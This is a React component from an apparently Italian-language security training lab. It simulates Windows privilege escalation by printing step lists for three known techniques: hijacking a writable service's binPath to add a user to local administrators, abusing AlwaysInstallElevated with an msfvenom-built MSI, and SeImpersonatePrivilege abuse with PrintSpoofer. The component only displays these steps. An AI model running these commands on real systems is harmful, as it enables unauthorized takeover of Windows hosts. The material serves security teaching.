import { useEffect, useState } from "react";
import { Cog, KeyRound, Package } from "lucide-react";
import { Button } from "@/components/ui/button";
import { InfoNote, SuccessNote } from "@/components/lab/Feedback";
import { cn } from "@/lib/utils";
import type { TaskContext } from "../../types";

type Path = "service" | "msi" | "token";

const PATHS: { id: Path; icon: typeof Cog; title: string; sub: string; steps: string[] }[] = [
  { id: "service", icon: Cog, title: "Servizio scrivibile (VulnSvc)", sub: "Bassa complessità, richiede riavvio del servizio", steps: ["sc config VulnSvc binPath= \"cmd.exe /c net localgroup administrators alex /add\"", "sc stop VulnSvc", "sc start VulnSvc", "→ alex ora è Administrator locale"] },
  { id: "msi", icon: Package, title: "AlwaysInstallElevated", sub: "Rumorosa (crea processo msiexec), ma velocissima", steps: ["reg query HKLM\\...\\Installer  → 0x1", "reg query HKCU\\...\\Installer  → 0x1", "msfvenom ... -f msi -o shell.msi", "msiexec /quiet /qn /i shell.msi", "→ shell SYSTEM"] },
  { id: "token", icon: KeyRound, title: "SeImpersonatePrivilege (via web shell IIS)", sub: "Silenziosa, sfrutta il token del servizio", steps: ["whoami /priv → SeImpersonate Enabled", "upload PrintSpoofer.exe", "PrintSpoofer.exe -i -c cmd", "→ shell NT AUTHORITY\\SYSTEM"] },
];

export default function Task09Lab({ markComplete, isComplete }: TaskContext) {
  const [choice, setChoice] = useState<Path | null>(null);
  const [seen, setSeen] = useState<Set<Path>>(new Set());
  useEffect(() => { if (seen.size >= 1) markComplete(); }, [seen, markComplete]);
  const pick = (id: Path) => { setChoice(id); setSeen((s) => new Set(s).add(id)); };
  const current = PATHS.find((p) => p.id === choice);

  return (
    <div>
      <div className="grid min-w-0 gap-3 md:grid-cols-3">
        {PATHS.map((p) => {
          const Icon = p.icon;
          const active = choice === p.id;
          return (
            <button key={p.id} onClick={() => pick(p.id)} className={cn("min-w-0 rounded-xl border p-4 text-left transition", active ? "border-accent bg-accent/10" : "border-border bg-surface hover:border-accent/50")}>
              <Icon className="h-5 w-5 text-gold-soft" />
              <div className="mt-2 text-sm font-semibold text-foreground">{p.title}</div>
              <div className="mt-1 text-xs text-muted-foreground">{p.sub}</div>
            </button>
          );
        })}
      </div>

      {current && (
        <div className="mt-4 min-w-0 rounded-xl border border-border bg-black p-4 font-mono text-[12px] text-ivory">
          <div className="mb-2 text-xs uppercase tracking-widest text-gold-soft">Simulazione: {current.title}</div>
          {current.steps.map((s, i) => (
            <div key={i} className="min-w-0 break-all [overflow-wrap:anywhere]"><span className="text-accent">{i + 1}.</span> {s}</div>
          ))}
        </div>
      )}

      <div className="mt-3 text-xs text-muted-foreground">Strade esplorate: {seen.size} / 3 · <Button variant="link" className="h-auto p-0 text-xs" onClick={() => { setChoice(null); setSeen(new Set()); }}>ricomincia</Button></div>

      {!choice && <InfoNote>Scegli una strada per vedere la simulazione. Le altre restano disponibili per confronto.</InfoNote>}
      {isComplete && <SuccessNote>Scalata a SYSTEM completata. Prova anche le altre strade per confrontare rumore e complessità.</SuccessNote>}
    </div>
  );
}
